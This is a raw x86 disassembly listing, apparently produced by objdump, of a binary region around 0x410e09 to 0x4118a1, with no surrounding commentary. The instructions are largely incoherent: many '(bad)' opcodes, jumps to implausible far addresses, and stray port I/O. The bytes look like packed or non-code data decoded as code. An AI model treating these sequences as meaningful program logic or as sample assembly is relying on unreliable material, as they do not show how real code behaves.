  410e09:	mov    BYTE PTR [ebx+0x3e000410],0x84
  410e10:	test   DWORD PTR [edx+eax*8],edi
  410e13:	cmp    DWORD PTR [ebp+0x0],eax
  410e16:	ds jo  0x410e4b
  410e19:	lea    eax,[ebx]
  410e1b:	sbb    al,0x34
  410e1d:	push   0x3f
  410e1f:	pop    edx
  410e20:	add    al,0x6a
  410e22:	cmovno esi,DWORD PTR ds:[eax+0x3d35b0e]
	...
  410e52:	add    BYTE PTR [eax],al
  410e54:	retf   
  410e55:	sbb    BYTE PTR [ecx],ch
  410e57:	xor    al,0x91
  410e59:	dec    eax
  410e5a:	ins    DWORD PTR es:[edi],dx
  410e5b:	aas    
  410e5c:	call   FWORD PTR [edx-0x1e]
  410e5f:	ret    
  410e60:	or     eax,0xba496a29
  410e65:	pop    ebx
  410e66:	mov    ch,0x17
  410e68:	mov    ebp,0xf203d8f0
  410e6d:	bound  esp,QWORD PTR [edx+0x31]
  410e70:	dec    esi
  410e71:	cmc    
  410e72:	sub    eax,0x1e5b1906
  410e77:	push   ecx
  410e78:	inc    esi
  410e79:	outs   dx,BYTE PTR ds:[esi]
  410e7a:	fwait
  410e7b:	mov    ecx,DWORD PTR [eax-0x18]
  410e7e:	dec    esp
  410e7f:	retf   
  410e80:	retf   0x915e
  410e83:	push   es
  410e84:	ds jle 0x410ec5
  410e87:	fmul   st(6),st
  410e89:	outs   dx,BYTE PTR ds:[esi]
  410e8a:	cmc    
  410e8b:	retf   0xe828
  410e8e:	sub    al,0xdc
  410e90:	adc    ecx,DWORD PTR [edi]
  410e92:	jmp    0xb129279a
  410e97:	fist   DWORD PTR [ebx]
  410e99:	in     al,dx
  410e9a:	aad    0xca
  410e9c:	or     al,ch
  410e9e:	mov    eax,0xc5ec0bdb
  410ea3:	retf   0xa49b
  410ea6:	stos   BYTE PTR es:[edi],al
  410ea7:	div    ecx
  410ea9:	push   es
  410eaa:	(bad)  
  410eab:	xlat   BYTE PTR ds:[ebx]
  410eac:	mov    esp,0x7a78a096
  410eb1:	outs   dx,DWORD PTR ds:[esi]
  410eb2:	cmp    BYTE PTR [esi+ebp*1-0x6],bl
  410eb6:	daa    
  410eb7:	add    al,0x0
	...
  410ee1:	add    BYTE PTR [eax+ebx*2+0x3],ah
  410ee5:	add    al,0x56
  410ee7:	pop    ebx
  410ee8:	or     al,BYTE PTR [ebp+0x3e]
  410eeb:	or     DWORD PTR [edx+0x645b3e28],0xffffffc3
  410ef2:	inc    eax
  410ef3:	jecxz  0x410ef4
  410ef5:	test   al,0x3d
  410ef7:	pop    ebx
  410ef8:	add    BYTE PTR [edx+0x6e],ah
  410efb:	outs   dx,DWORD PTR ds:[esi]
  410efc:	mov    bh,bl
  410efe:	push   ss
  410eff:	pop    ss
  410f00:	clc    
  410f01:	mov    ecx,0x56fbe684
  410f06:	push   ebx
  410f07:	dec    edi
  410f08:	test   DWORD PTR [ecx],ebp
  410f0a:	test   ch,dl
  410f0c:	popf   
  410f0d:	jmp    0xbcc46a4f
  410f12:	test   DWORD PTR [ebp+0xd],ebp
  410f15:	ins    DWORD PTR es:[edi],dx
  410f16:	fldcw  WORD PTR [ebp-0x2]
  410f19:	jmp    0xea15259a
  410f1e:	cmp    eax,0xfe26005b
  410f23:	xchg   edx,eax
  410f24:	(bad)  
  410f25:	call   0xa5086a67
  410f2a:	lea    esi,ds:0x943de900
  410f30:	inc    esp
  410f31:	sub    eax,0xe9005b3d
  410f36:	test   al,0x7
  410f38:	clc    
  410f39:	bound  ebp,QWORD PTR [ebx]
  410f3b:	loopne 0x410f81
  410f3d:	mov    ch,0x52
  410f3f:	fiadd  WORD PTR [ecx+edi*4+0x4a]
  410f43:	add    DWORD PTR [ecx],eax
  410f45:	(bad)  
	...
  410f6e:	add    BYTE PTR [eax],al
  410f70:	jns    0x410fe5
  410f72:	(bad)  
  410f73:	cmp    eax,DWORD PTR [esi]
  410f75:	(bad)  
  410f76:	sar    BYTE PTR [esi+ebp*1],0xd8
  410f7a:	jl     0x410f29
  410f7c:	cmp    eax,0x816a4de6
  410f81:	xchg   edi,edi
  410f83:	xor    al,0x7c
  410f85:	add    esi,DWORD PTR [eax]
  410f87:	or     bh,BYTE PTR [ebp+0x5b]
  410f8a:	call   DWORD PTR [esi+ecx*4]
  410f8d:	je     0x410f7d
  410f8f:	xor    al,0x42
  410f91:	pop    ebx
  410f92:	or     ebp,DWORD PTR [ecx+0x66616e]
  410f98:	call   0x2e410ff4
  410f9d:	sub    al,0xc8
  410f9f:	jmp    0x410f39
  410fa1:	fwait
  410fa2:	inc    ebx
  410fa3:	enter  0x5897,0x0
  410fa7:	add    BYTE PTR [eax],ah
  410fa9:	sbb    al,0xc8
  410fab:	jmp    FWORD PTR [edx-0x44]
  410fae:	std    
  410faf:	jne    0x410f50
  410fb1:	nop
  410fb2:	in     al,0xfd
  410fb4:	lock mov eax,ds:0x8f5b75fd
  410fba:	cmp    BYTE PTR [ebp+0x67],bl
  410fbd:	pop    eax
  410fbe:	cmp    DWORD PTR [ebp+0x4f],0x57
  410fc2:	je     0x410fcc
  410fc4:	adc    BYTE PTR [eax+ebx*8],bl
  410fc7:	call   0x41453f
  410fcc:	sub    al,0xf3
  410fce:	mov    DWORD PTR [ebp+0x2f],edx
  410fd1:	out    dx,al
  410fd2:	adc    bh,bh
	...
  410ffc:	add    BYTE PTR [eax],al
  410ffe:	stos   BYTE PTR es:[edi],al
  410fff:	mov    al,ds:0xef2f52fd
  411004:	push   ebx
  411005:	cld    
  411006:	lods   al,BYTE PTR ds:[esi]
  411007:	gs std 
  411009:	jne    0x41103e
  41100b:	mov    ds:0x955e0850,eax
  411010:	add    al,BYTE PTR [eax]
  411012:	pop    edx
  411013:	out    dx,al
  411014:	jmp    0x3283:0x5477db83
  41101b:	or     esp,DWORD PTR [ebx+0x41]
  41101e:	pop    ss
  41101f:	pop    eax
  411020:	jne    0x411040
  411022:	test   al,0x6c
  411024:	jb     0x411089
  411026:	es push edi
  411028:	add    DWORD PTR [eax],eax
  41102a:	xlat   BYTE PTR ds:[ebx]
  41102b:	push   edi
  41102c:	mov    esi,0x187478
  411031:	jmp    0x41101b
  411033:	stc    
  411034:	shl    BYTE PTR [esi],0xe5
  411037:	(bad)  
  411038:	les    eax,FWORD PTR [edx]
  41103a:	ds pop esp
  41103c:	test   DWORD PTR ds:0x82d5473e,edi
  411042:	jnp    0x411096
  411044:	cmp    eax,0xf7823e41
  411049:	and    DWORD PTR [ebp-0x42fffd7f],0xffffffbe
  411050:	ss dec ebx
  411052:	inc    DWORD PTR [ecx+0x1bba0f02]
  411058:	add    eax,DWORD PTR [eax]
  41105a:	add    DWORD PTR ds:[esi],eax
  41105d:	test   ch,dh
  41105f:	ret    0x2
	...
  41108a:	add    BYTE PTR [eax],al
  41108c:	dec    ecx
  41108d:	(bad)  
  41108e:	loope  0x41108f
  411090:	jno    0x411013
  411092:	mov    edi,0x2816a44
  411097:	add    BYTE PTR [esi],bh
  411099:	xor    eax,0x823ef83e
  41109e:	add    al,BYTE PTR [eax]
  4110a0:	ret    
  4110a1:	mov    dh,0xc6
  4110a3:	dec    edi
  4110a4:	mov    ebx,0xd44fcabe
  4110a9:	sbb    DWORD PTR [edx-0x3e],0xff02b39d
  4110b0:	dec    ebx
  4110b1:	mov    eax,0x7d3e413b
  4110b6:	ret    0xba0e
  4110b9:	xor    al,BYTE PTR [ebx]
  4110bb:	add    BYTE PTR [esi],bh
  4110bd:	cmc    
  4110be:	dec    eax
  4110bf:	clc    
  4110c0:	ds jns 0x411141
  4110c3:	stos   DWORD PTR es:[edi],eax
  4110c4:	ds je  0x4110c9
  4110c7:	add    DWORD PTR [ebx-0x3df0fc68],0xffffffd6
  4110ce:	add    eax,DWORD PTR [eax]
  4110d0:	ds in  eax,dx
  4110d2:	push   eax
  4110d3:	cld    
  4110d4:	xlat   BYTE PTR ds:[ebx]
  4110d5:	test   BYTE PTR [ebx],0x0
  4110d8:	ds push edx
  4110da:	jnp    0x411111
  4110dc:	fstp   DWORD PTR [ebx+0x1f]
  4110df:	in     al,dx
  4110e0:	shl    BYTE PTR [eax],0x99
  4110e3:	(bad)  
  4110e4:	push   ebx
  4110e5:	inc    edi
  4110e6:	inc    cx
  4110e8:	retf   0x10f3
  4110eb:	arpl   di,di
  4110ed:	pop    edx
  4110ee:	xchg   ecx,eax
  4110ef:	in     eax,dx
	...
  411118:	add    BYTE PTR [eax],al
  41111a:	adc    eax,0x89b4e95b
  41111f:	fisubr WORD PTR [eax-0x76df48fe]
  411125:	pop    esp
  411126:	push   ss
  411127:	(bad)  
  411128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411129:	add    eax,ecx
  41112b:	and    BYTE PTR [ebp-0x41],al
  41112e:	add    dh,BYTE PTR [edi-0x18]
  411131:	add    edi,DWORD PTR [esi]
  411133:	pop    ebx
  411134:	pop    esp
  411135:	inc    ecx
  411136:	or     dx,bx
  411139:	add    al,0xe4
  41113b:	pop    edx
  41113c:	rol    DWORD PTR [ebx],cl
  41113e:	mov    ebx,0xd4344920
  411143:	pop    edx
  411144:	pop    esp
  411145:	inc    ecx
  411146:	dec    esi
  411147:	or     esp,DWORD PTR [esi]
  411149:	icebp  
  41114a:	mov    ebp,0x3503a816
  41114f:	fwait
  411150:	pushf  
  411151:	sbb    BYTE PTR [ebp-0x4dfc0318],bh
  411157:	inc    edx
  411158:	inc    ecx
  411159:	add    eax,0xfae95b3e
  41115e:	jmp    0xab07f051
  411163:	push   ebx
  411164:	out    dx,al
  411165:	push   eax
  411166:	es push 0x5b
  411169:	fcom   DWORD PTR [eax]
  41116b:	icebp  
  41116c:	lock pop ebx
  41116e:	inc    edx
  41116f:	pop    ebx
  411170:	mov    BYTE PTR [ebp-0x392d4fe7],0xf8
  411177:	imul   edi,DWORD PTR [ebx],0x2283d9d8
  41117d:	add    al,0x0
	...
  4111a7:	add    BYTE PTR [esi],bh
  4111a9:	or     DWORD PTR [eax],eax
  4111ab:	mov    dh,0x26
  4111ad:	arpl   WORD PTR [edx+0x7cdcd9a7],ax
  4111b3:	mov    eax,ds:0x6a08ef3d
  4111b8:	inc    ebx
  4111b9:	pop    ebx
  4111ba:	(bad)  
  4111bc:	push   0x808efe6a
  4111c1:	out    dx,al
  4111c2:	sti    
  4111c3:	xchg   BYTE PTR [esi+0x42284b19],ch
  4111c9:	or     ecx,ecx
  4111cb:	stos   DWORD PTR es:[edi],eax
  4111cc:	mov    eax,ds:0x71625369
  4111d1:	fadd   st(3),st
  4111d3:	popa   
  4111d4:	neg    DWORD PTR [edx+0x6a]
  4111d7:	push   cs
  4111d8:	sub    esi,0xf56c4107
  4111de:	dec    BYTE PTR [esi-0x6]
  4111e1:	push   ds
  4111e2:	cld    
  4111e3:	push   0x46
  4111e5:	(bad)  
  4111e6:	dec    edx
  4111e7:	test   al,0x3d
  4111e9:	pop    ebx
  4111ea:	je     0x4111e2
  4111ec:	mov    al,ds:0x3de9f81e
  4111f1:	pop    ebx
  4111f2:	add    dl,dl
  4111f4:	jge    0x41120f
  4111f6:	push   eax
  4111f7:	mov    ecx,0xbbf80ec6
  4111fc:	js     0x41124c
  4111fe:	pushf  
  4111ff:	mov    ds:0x29855b82,al
  411204:	sbb    BYTE PTR [ebp-0x15],0xca
  411208:	mov    esp,0xe9f7e7
	...
  411235:	add    BYTE PTR [esi+0x75d2eb5d],cl
  41123b:	retf   0x29a2
  41123e:	cmp    ch,BYTE PTR [eax+0x74]
  411241:	loope  0x411246
  411243:	lock pop es
  411245:	shr    DWORD PTR [edi+0x62],0xfe
  411249:	into   
  41124a:	ja     0x41125b
  41124c:	clc    
  41124d:	add    BYTE PTR [ebp+ebp*2-0x3],ch
  411251:	jne    0x411252
  411253:	sahf   
  411254:	push   eax
  411255:	or     BYTE PTR [eax+0x10e80818],ch
  41125b:	mov    al,ds:0x1898fffd
  411260:	or     al,ch
  411262:	jg     0x411205
  411264:	std    
  411265:	jmp    FWORD PTR [eax+0x52fffc18]
  41126b:	addr16 out 0xd3,al
  41126e:	dec    ebx
  41126f:	sahf   
  411270:	std    
  411271:	leave  
  411272:	aad    0x5b
  411274:	add    BYTE PTR [ebp+0x1c],dl
  411277:	add    DWORD PTR [ecx+0x573917c4],0x53
  41127e:	or     al,0x38
  411280:	or     al,0xc7
  411282:	xchg   ebp,eax
  411283:	pop    esp
  411284:	add    BYTE PTR [eax],al
  411286:	xchg   edi,eax
  411287:	lahf   
  411288:	jae    0x411292
  41128a:	jmp    FWORD PTR [edi+0x58]
  41128d:	add    BYTE PTR [edi-0x25],ah
  411290:	test   BYTE PTR [ecx],0xb0
  411293:	gs sub eax,eax
  411296:	int3   
  411297:	aas    
  411298:	pop    esi
  411299:	leave  
	...
  4112c2:	add    BYTE PTR [eax],al
  4112c4:	and    eax,0x2fd0fe67
  4112c9:	loop   0x41131e
  4112cb:	or     al,0xce
  4112cd:	pop    esp
  4112ce:	mov    ebx,eax
  4112d0:	pop    eax
  4112d1:	fcmovu st,st(0)
  4112d3:	add    BYTE PTR [edi],ah
  4112d5:	pop    esp
  4112d6:	mov    esi,DWORD PTR [ebp+0x2f]
  4112d9:	jecxz  0x411356
  4112db:	or     BYTE PTR [ebp+esi*1+0x66],cl
  4112df:	mov    edx,DWORD PTR [ecx]
  4112e1:	fdiv   st(2),st
  4112e3:	xor    BYTE PTR [ebp+0x5efc7e62],dl
  4112e9:	push   ss
  4112ea:	add    eax,0xeb4bfb80
  4112ef:	sbb    edi,DWORD PTR [esi]
  4112f1:	repnz mov BYTE PTR [eax+0x6c],0x87
  4112f6:	cmp    bl,0x78
  4112f9:	sub    esp,edi
  4112fb:	jg     0x4112d7
  4112fd:	xor    al,BYTE PTR [ebx+eax*8+0x2af99d34]
  411304:	dec    BYTE PTR [ebp+eiz*1+0x5e]
  411308:	pop    es
  411309:	mov    ah,0xfa
  41130b:	inc    DWORD PTR ds:0x2085082
  411311:	mov    ecx,DWORD PTR [ebx+0x4]
  411314:	push   0xffffff82
  411316:	xlat   BYTE PTR ds:[ebx]
  411317:	push   ss
  411318:	jb     0x41134d
  41131a:	push   edx
  41131b:	or     ch,BYTE PTR [edx+0x40]
  41131e:	dec    ebp
  41131f:	push   es
  411320:	push   edx
  411321:	xor    eax,DWORD PTR [eax]
  411323:	or     ah,BYTE PTR [ebp+0xc0177a]
	...
  411351:	add    ch,dh
  411353:	mov    al,ds:0x697cc924
  411358:	add    al,al
  41135a:	sahf   
  41135b:	jne    0x411355
  41135d:	ret    
  41135e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41135f:	mov    esp,0x6d3cc57f
  411364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411365:	je     0x411303
  411367:	in     al,dx
  411368:	cmp    eax,0x7361610c
  41136d:	inc    esp
  41136e:	push   esi
  41136f:	cmp    BYTE PTR [esi+0x8],cl
  411372:	shl    DWORD PTR [esi+0x4e03c6c6],0x3
  411379:	add    BYTE PTR [esi],bh
  41137b:	jb     0x4113fc
  41137d:	cmp    al,0xc2
  41137f:	mov    ecx,0xe83e0041
  411384:	sub    al,0x8d
  411386:	and    DWORD PTR [ecx+esi*1+0x6a],0x3f
  41138b:	fiadd  DWORD PTR [edx]
  41138d:	push   0x3e
  41138f:	fiadd  DWORD PTR [edx]
  411391:	push   0x3e
  411393:	pop    ebx
  411394:	je     0x4113df
  411396:	push   es
  411397:	or     al,0xde
  411399:	sbb    DWORD PTR [edx+0x45042812],edi
  41139f:	fwait
  4113a0:	push   esp
  4113a1:	(bad)  
  4113a2:	mov    esp,0x7204bce8
  4113a7:	das    
  4113a8:	jb     0x4113f3
  4113aa:	xor    dl,dl
  4113ac:	and    esi,DWORD PTR [esp+edx*1-0x2a11c9ad]
  4113b3:	rcr    BYTE PTR [ebx],cl
  4113b5:	mov    eax,0x0
	...
  4113de:	add    BYTE PTR [eax],al
  4113e0:	mov    ah,0xe8
  4113e2:	lock mov ?,WORD PTR [edx+0x6b]
  4113e6:	mov    DWORD PTR [esi],eax
  4113e8:	lods   eax,DWORD PTR ds:[esi]
  4113e9:	mov    edi,0x66424961
  4113ee:	sti    
  4113ef:	mov    bl,0xb8
  4113f1:	pop    ebx
  4113f2:	jle    0x41142d
  4113f4:	stos   BYTE PTR es:[edi],al
  4113f5:	jae    0x4113b3
  4113f7:	pop    esp
  4113f8:	ds pop ebx
  4113fa:	xor    DWORD PTR ds:0x5ee95b3e,eax
  411400:	jmp    0x3a074409
  411405:	pop    ebx
  411406:	add    al,ah
  411408:	adc    al,0x6
  41140a:	scas   eax,DWORD PTR es:[edi]
  41140b:	int3   
  41140c:	jg     0x411461
  41140e:	jmp    0x69b8c96b
  411413:	enter  0xf3a1,0xe8
  411417:	jecxz  0x411472
  411419:	inc    ax
  41141b:	add    ah,al
  41141d:	gs and eax,0x9067028d
  411423:	add    ebx,DWORD PTR [esi]
  411425:	pop    ebx
  411426:	jmp    0xe3682d6
  41142b:	ret    
  41142c:	(bad)  
  41142d:	pop    ds
  41142e:	add    DWORD PTR [esi+edi*1],ebp
  411431:	cmp    ebp,ecx
  411433:	add    edx,DWORD PTR [esi]
  411435:	aas    
  411436:	add    BYTE PTR [edi-0x5b779b04],al
  41143c:	leave  
  41143d:	std    
  41143e:	dec    DWORD PTR [eax]
  411440:	inc    edx
  411441:	pop    ebx
  411442:	call   0x41153d
	...
  41146b:	add    BYTE PTR [eax],al
  41146d:	add    BYTE PTR [edi+0x66],cl
  411470:	(bad)  
  411471:	pusha  
  411472:	xchg   BYTE PTR [ebx+0x67],ch
  411475:	jmp    0xd23f7a57
  41147a:	cmp    esi,ebp
  41147c:	(bad)  
  41147d:	mov    esi,0x41ec1eb2
  411482:	inc    edx
  411483:	cmp    eax,DWORD PTR [eax]
  411485:	jmp    0xa6ad7b2f
  41148a:	cld    
  41148b:	rol    BYTE PTR [ecx+edx*4+0x15],cl
  41148f:	pop    ebx
  411490:	and    cl,ch
  411492:	cmp    eax,0x7cfcef73
  411497:	mov    BYTE PTR fs:[esi+edx*8],ch
  41149b:	fs je  0x411477
  41149e:	push   ebp
  41149f:	bound  bp,DWORD PTR [eax]
  4114a2:	inc    edx
  4114a3:	data16 je 0x411513
  4114a6:	in     eax,0x85
  4114a8:	pop    eax
  4114a9:	jmp    0xee04eeeb
  4114ae:	jl     0x41149e
  4114b0:	xadd   DWORD PTR [ebx-0x1],edx
  4114b4:	inc    eax
  4114b5:	jmp    0x52390336
  4114ba:	mov    es,WORD PTR [edx]
  4114bc:	add    cl,ch
  4114be:	mov    eax,0x16360b99
  4114c3:	dec    ebx
  4114c4:	push   0x1c2606
  4114c9:	es push es
  4114cb:	outs   dx,DWORD PTR ds:[esi]
  4114cc:	out    0x63,eax
  4114ce:	loop   0x41152a
  4114d0:	add    BYTE PTR [edx+0x0],ch
	...
  4114fb:	add    BYTE PTR [ecx],al
  4114fd:	push   ecx
  4114fe:	call   DWORD PTR [ebp+ecx*2-0x44ffba0d]
  411505:	pop    ds
  411506:	add    bh,bh
  411508:	stos   BYTE PTR es:[edi],al
  411509:	test   al,0xe6
  41150b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41150c:	scas   al,BYTE PTR es:[edi]
  41150d:	pop    eax
  41150e:	add    BYTE PTR [ebx+0x75ff545b],al
  411514:	pop    es
  411515:	xor    DWORD PTR [ecx+0x64],ebx
  411518:	push   esi
  411519:	pop    edi
  41151a:	push   DWORD PTR [ebp+0x3]
  41151d:	mov    eax,0x58e75992
  411522:	add    esp,0xfffffff3
  411525:	fwait
  411526:	jae    0x411534
  411528:	(bad)
  41152c:	out    0x9b,eax
  41152e:	jae    0x411518
  411530:	(bad)  
  411531:	fcom   DWORD PTR [edi+0x0]
  411534:	xlat   BYTE PTR ds:[ebx]
  411535:	ffreep st(2)
  411537:	or     al,0xa0
  411539:	sub    al,0x10
  41153b:	push   0x41334c
  411540:	shr    BYTE PTR [esp+eiz*8],0xe8
  411544:	push   ecx
  411545:	add    BYTE PTR [eax],al
  411547:	add    BYTE PTR [ebx+edx*4],dl
  41154a:	or     ch,BYTE PTR [edx-0x59]
  41154d:	fwait
  41154e:	jae    0x41154c
  411550:	and    BYTE PTR [esp+ecx*1],ch
  411553:	jmp    FWORD PTR [edx]
  411555:	cmc    
  411556:	inc    esi
  411557:	inc    ecx
  411558:	xchg   edi,eax
  411559:	mov    al,0x54
  41155b:	jo     0x41156d
  41155d:	call   0x0:0x4587
	...
  411588:	add    BYTE PTR [eax],al
  41158a:	pop    es
  41158b:	xor    eax,0xa0aaff00
  411590:	std    
  411591:	jne    0x4115e6
  411593:	fwait
  411594:	xor    ebp,DWORD PTR [edx-0x17ffe661]
  41159a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41159b:	sub    bh,bh
  41159d:	dec    esi
  41159f:	sbb    ebx,esp
  4115a1:	push   0x57
  4115a3:	fwait
  4115a4:	jae    0x41159a
  4115a6:	ds dec ebp
  4115a8:	aaa    
  4115a9:	or     al,0x31
  4115ab:	(bad)  
  4115ac:	ins    BYTE PTR es:[edi],dx
  4115ad:	inc    edi
  4115ae:	jg     0x411622
  4115b0:	stos   BYTE PTR es:[edi],al
  4115b1:	sub    DWORD PTR [esi-0x7c77409b],ebp
  4115b7:	dec    edx
  4115b8:	add    BYTE PTR cs:[ecx],dl
  4115bb:	out    dx,eax
  4115bc:	mov    dl,0xfe
  4115be:	xchg   ebx,eax
  4115bf:	mov    bh,BYTE PTR [edi+0x4329d434]
  4115c5:	add    dh,ah
  4115c7:	gs xor bh,bh
  4115ca:	icebp  
  4115cb:	cli    
  4115cc:	inc    ebp
  4115cd:	aam    0x54
  4115cf:	jb     0x411590
  4115d1:	je     0x4115a5
  4115d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115d4:	xor    eax,0x6c66d9e8
  4115d9:	inc    edi
  4115da:	jg     0x41164e
  4115dc:	stos   BYTE PTR es:[edi],al
  4115dd:	std    
  4115de:	pop    ecx
  4115df:	mov    ebp,0xa27b88bf
  4115e4:	lea    eax,[esi+edi*2+0x21]
  4115e8:	shl    DWORD PTR [edx+ebx*4-0x2c],0x35
  4115ed:	or     al,0x0
	...
  411617:	add    BYTE PTR [ecx-0xb8935a],ch
  41161d:	jno    0x4115c9
  41161f:	in     eax,0x29
  411621:	in     eax,dx
  411622:	mov    edi,0x83c5fb88
  411627:	jl     0x4115c7
  411629:	jno    0x41163a
  41162b:	test   cl,cl
  41162d:	jno    0x411631
  41162f:	add    BYTE PTR [ebp+0x40ffd68e],bh
  411635:	(bad)  
  411636:	ins    DWORD PTR es:[edi],dx
  411637:	jmp    FWORD PTR [ecx+0x71]
  41163a:	cmp    DWORD PTR [esi+ecx*4+0x71],0xf
  41163f:	test   BYTE PTR [ebp-0x3cfffd8f],bl
  411645:	mov    esi,0x5a494fc6
  41164a:	pushf  
  41164b:	xlat   BYTE PTR ds:[ebx]
  41164c:	pop    ecx
  41164d:	or     bl,BYTE PTR [eax+eax*8]
  411650:	cmp    BYTE PTR [edi+0x29],dl
  411653:	adc    BYTE PTR [edx+0x3e03e8d2],bh
  411659:	fiadd  WORD PTR [ebx+0x655221c7]
  41165f:	xchg   BYTE PTR [ecx],bl
  411661:	arpl   ax,bp
  411663:	mov    ?,WORD PTR [edx-0x6d]
  411666:	cwde   
  411667:	rcl    BYTE PTR [edx+0x2f2d08b],0x63
  41166e:	fisttp QWORD PTR [ebx]
  411670:	(bad)  
  411671:	out    0x5b,eax
  411673:	xor    DWORD PTR [edx-0x6d],0xffffffe8
  411677:	aaa    
  411678:	pop    ecx
  411679:	repz fadd DWORD PTR [ebx]
	...
  4116a4:	add    BYTE PTR [eax],al
  4116a6:	shl    DWORD PTR [ecx+0x734639bd],1
  4116ac:	shr    DWORD PTR [ecx+edx*8],cl
  4116af:	bound  ebp,QWORD PTR [ebp+0x1b62de39]
  4116b5:	or     al,0xd6
  4116b7:	out    0xf,eax
  4116b9:	mov    edi,0xe01b62b8
  4116be:	mov    al,0xe8
  4116c0:	loopne 0x41166d
  4116c2:	push   ss
  4116c3:	hlt    
  4116c4:	test   DWORD PTR [edi-0x405f1760],edi
  4116ca:	adc    dl,BYTE PTR [ebx-0x7f]
  4116cd:	pop    esi
  4116ce:	daa    
  4116cf:	bound  ebp,QWORD PTR [ebp-0x41]
  4116d2:	adc    dl,BYTE PTR [edi+0x626a3965]
  4116d8:	ror    DWORD PTR [ebx],cl
  4116da:	data16 aaa 
  4116dc:	sar    BYTE PTR [esi-0x342c9d90],0x68
  4116e3:	call   0x532bd600
  4116e8:	push   ecx
  4116e9:	push   ss
  4116ea:	out    0x61,eax
  4116ec:	push   DWORD PTR ds:0xe9cbdfbd
  4116f2:	adc    DWORD PTR [eax-0x7d],ecx
  4116f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116f6:	jge    0x411756
  4116f8:	jne    0x4116e8
  4116fa:	les    edx,FWORD PTR [esi]
  4116fc:	int3   
  4116fd:	push   ss
  4116fe:	sub    ah,BYTE PTR [ecx+0x74]
  411701:	loope  0x4116d8
  411703:	cwde   
  411704:	addr16 push es
  411706:	loope  0x41177c
  411708:	or     DWORD PTR [ebx+0x0],edx
	...
  411732:	add    BYTE PTR [eax],al
  411734:	cmp    eax,0xe5e17462
  411739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41173a:	addr16 out dx,al
  41173c:	enter  0x7460,0xe5
  411740:	aad    0x5b
  411742:	ins    BYTE PTR es:[edi],dx
  411743:	fidivr WORD PTR [eax-0x5a2e8ba0]
  411749:	arpl   WORD PTR [edx-0x32],bp
  41174c:	test   al,0x60
  41174e:	je     0x41170d
  411750:	xchg   ebp,eax
  411751:	imul   ebp,DWORD PTR [edx-0x42],0xffffff98
  411755:	pusha  
  411756:	je     0x411711
  411758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411759:	jae    0x4117c5
  41175b:	scas   al,BYTE PTR es:[edi]
  41175c:	mov    BYTE PTR [eax+0x74],ah
  41175f:	xchg   ebp,eax
  411760:	xchg   ebp,eax
  411761:	jnp    0x4117cd
  411763:	sahf   
  411764:	clc    
  411765:	pusha  
  411766:	je     0x4116e9
  411768:	in     eax,0x83
  41176a:	push   0xffffff8e
  41176c:	call   0xd5ce8bd1
  411771:	mov    ebp,DWORD PTR [edx+0x7e]
  411774:	fsub   DWORD PTR [eax+0x74]
  411777:	mov    ebp,esp
  411779:	xchg   ebx,eax
  41177a:	push   0x6e
  41177c:	enter  0x7460,0x45
  411780:	aad    0x9b
  411782:	push   0x5e
  411784:	mov    eax,0xa5317460
  411789:	mov    ds:0x60a84e6a,eax
  41178e:	je     0x411790
  411790:	inc    ebx
  411791:	mov    dh,0xb0
  411793:	imul   ebx,DWORD PTR [eax],0xffffffa1
  411796:	std    
  411797:	jne    0x411799
	...
  4117c1:	add    BYTE PTR [edi],dh
  4117c3:	mov    dh,0xa8
  4117c5:	imul   ebx,DWORD PTR [eax],0xffffffa1
  4117c8:	std    
  4117c9:	jne    0x4117d6
  4117cb:	mov    dh,0xa0
  4117cd:	imul   ebx,DWORD PTR [eax-0x5f],0xffffffc7
  4117d1:	ret    0x5d1b
  4117d4:	push   ebp
  4117d5:	mov    ebp,DWORD PTR [ebx]
  4117d7:	ffree  st(2)
  4117d9:	call   0x8e3eb6fe
  4117de:	loop   0x411780
  4117e0:	dec    esi
  4117e1:	call   DWORD PTR [edx+0x7d35ff50]
  4117e7:	adc    al,0x41
  4117e9:	add    bh,ch
  4117eb:	call   0x54281845
  4117f0:	ror    BYTE PTR [edi],0x62
  4117f3:	inc    ebx
  4117f4:	add    DWORD PTR [eax],eax
  4117f6:	xlat   BYTE PTR ds:[ebx]
  4117f7:	xchg   edi,eax
  4117f8:	inc    ebx
  4117f9:	clc    
  4117fa:	xlat   BYTE PTR ds:[ebx]
  4117fb:	pop    esp
  4117fc:	add    BYTE PTR [eax],al
  4117fe:	mov    al,ds:0xe0fff418
  411803:	pop    esp
  411804:	add    BYTE PTR [edx-0x29],ch
  411807:	xor    al,BYTE PTR [eax]
  411809:	push   0xffffffd7
  41180b:	xor    al,BYTE PTR [eax]
  41180d:	lea    esp,[edx-0x5d]
  411810:	dec    esi
  411811:	lea    esp,[edx]
  411813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411814:	cmc    
  411815:	(bad)  
  411816:	mov    eax,0xbf75ff07
  41181b:	sahf   
  41181c:	jae    0x41181a
  41181e:	scas   eax,DWORD PTR es:[edi]
  41181f:	(bad)  
  411820:	push   ebp
  411821:	add    BYTE PTR [edi+0x74c053],ah
	...
  41184f:	add    BYTE PTR [edx-0x68ff2a4b],ah
  411855:	pop    esp
  411856:	push   0x1daf86
  41185b:	(bad)  
  41185c:	ds jg  0x41186d
  41185f:	call   0xfefcb8ea
  411864:	push   cs
  411865:	in     eax,dx
  411866:	ror    DWORD PTR [ebx+eax*8+0x51feb522],cl
  41186d:	ret    0xe850
  411870:	jbe    0x411812
  411872:	mov    ebx,0xabefb7fe
  411877:	idiv   BYTE PTR [ecx]
  411879:	inc    ecx
  41187a:	lods   al,BYTE PTR ds:[esi]
  41187b:	sbb    eax,0x8cbd49a5
  411880:	add    DWORD PTR [edx+0x54],0x68
  411884:	sub    eax,0x190041d5
  411889:	daa    
  41188a:	lods   al,BYTE PTR ds:[esi]
  41188b:	not    BYTE PTR [ecx]
  41188d:	imul   edi,DWORD PTR [ebx+0x41b9d434],0x2e561600
  411897:	(bad)  
  411898:	stc    
  411899:	jmp    0x82bb:0x88e9eb85
  4118a0:	stos   DWORD PTR es:[edi],eax
  4118a1:	popf   
